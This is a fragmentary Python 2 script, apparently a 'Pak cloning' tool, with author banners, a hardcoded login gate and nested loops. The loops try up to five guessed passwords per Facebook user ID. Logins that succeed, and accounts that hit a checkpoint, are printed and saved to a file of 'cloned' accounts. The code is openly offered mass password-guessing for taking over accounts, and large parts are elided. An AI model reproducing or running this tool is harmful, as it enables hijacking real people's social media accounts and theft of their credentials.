...
\033[1;94mFACEBOOK  Tera.Yaar.hoon.main.0
                  
\033[1;92mFB PAGE   RASHEDHACKER
...
╔══──────────────────────────╗─══╗
║ OWNER 💓💓💓RED-MAFIA  KING RASHED-DADU          ║║
║  GITHUB 💝💝💝 rashedulislammanik.git(King)   ║ ║
║ FACEBOOK 💝💝💝RASHED-HACKER ║ ║
║  ENJOY 💝💝💝Pak Cloning                ║ ║
...
╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝
                ...
                DON'T COPY MY SCRIPT RASHED-DADU   
                        (RASHED-DADU)
╔══──────────────────────────╗─══╗
║OWNER 💓💓💓KING RASHED(DADU)                              ║
║  GITHUB 💝💝💝 rashedulislammanik.git                            ║
║ FACEBOOK 💝💝💝 https://Facebook.com/Tera.Yaar.hoon.main.0              ║
║  ENJOY 💝💝💝Pak Cloning                             ║
║   Note 💝💝💝Use Fastest Speed Net             ║
╚══──────────────────────────╝─══╝
"""
print("""
Owner: RED-MAFIA KING RASHED(DADU)
Facebook: https://m.me/Tera.Yaar.hoon.main.0

""")
CorrectUsername = "RASHED"
CorrectPassword = "DADU"
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
	    ...
	    time.sleep(2)
            ...
            os.system('xdg-https://wa.me/+8801829772192')
    else:
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;32m[DADU-OK]  ' + k + c + user + '  |  ' + pass1                                       
                ...
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;97m[DADU-CP] ' + k + c + user + '  |  ' + pass1
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;32m[DADU-OK]  ' + k + c + user +  '  |  ' + pass2
                        okb = open('save/cloned.txt', 'a')
                        ...
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;97m[DADU-CP] ' + k + c + user + '  |  ' + pass2
                            cps = open('save/cloned.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;32m[DADU-OK]  ' + k + c + user + '  |  ' + pass3
                                okb = open('save/cloned.txt', 'a')
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;97m[DADU-CP] ' + k + c + user + '  |  ' + pass3 
                                    cps = open('save/cloned.txt', 'a')
                                    ...
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;32m[DADU-OK]  ' + k + c + user + '  |  ' + pass4 
                                        okb = open('save/cloned.txt', 'a')
                                        ...
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;97m[DADU-CP] ' + k + c + user + '  |  ' + pass4
                                            cps = open('save/cloned.txt', 'a')
                                            ...
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;32m[DADU-OK]  ' + k + c + user + '  |  ' + pass5
                                                okb = open('save/cloned.txt', 'a')
                                                ...
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;97m[DADU-CP] ' + k + c + user + '  |  ' + pass5 
                                                    cps = open('save/cloned.txt', 'a')
...
\033[1;95mFb\033[1;97mRASHED-DADU"""
